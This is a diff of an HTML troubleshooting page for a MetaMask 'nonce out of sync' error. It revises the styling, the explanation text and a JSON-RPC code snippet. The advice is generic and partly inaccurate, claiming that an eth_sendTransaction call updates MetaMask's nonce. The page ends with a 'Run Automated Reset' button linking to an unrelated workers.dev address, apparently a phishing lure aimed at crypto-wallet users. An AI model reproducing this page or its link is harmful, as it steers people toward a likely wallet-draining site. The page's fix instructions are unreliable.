@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message stating "MetaMask nonce out of sync" while attempting to send a transaction on the Ethereum network, indicating a discrepancy between the expected and actual nonce values.</li>
+<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from concurrent transactions or network congestion.</li>
+<li>The error occurs due to a mismatch between the expected nonce value and the actual nonce value stored in the user's MetaMask wallet. This can happen when a transaction is sent but not confirmed, or when a user has multiple wallets or devices with different nonce values.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resynchronize the nonce value:</li>
-<li>Update the account settings to use the "Reset Account" feature</li>
-<li>Utilize the Ethereum blockchain explorer to verify the correct nonce value</li>
-<li>Employ the following command in a terminal to reset the nonce manually:</li>
+<li>Reset the account in MetaMask to resync the nonce.</li>
+<li>Use the Ethereum JSON-RPC <code>eth_getTransactionCount</code> method to manually retrieve the current nonce value.</li>
+<li>Update the nonce value in MetaMask using the following code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction({from: &#39;0x...YOUR_ADDRESS...&#39;, to: &#39;0x...YOUR_ADDRESS...&#39;, value: 0, gas: 0, gasPrice: 0, nonce: ...CORRECT_NONCE_VALUE...})&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>geth<span class="w"> </span>console
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="o">({</span>
+<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...new_nonce_value&quot;</span>
+<span class="o">})</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and diagnosis. </p>
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>A basic understanding of Ethereum and MetaMask</li>
-<li>Access to the Ethereum blockchain explorer (e.g., Etherscan)</li>
-<li>Familiarity with command-line interfaces (CLI) and JSON-RPC commands</li>
+<li>Access to the Ethereum network via a node or provider</li>
+<li>The ability to send transactions using Ethereum JSON-RPC methods</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
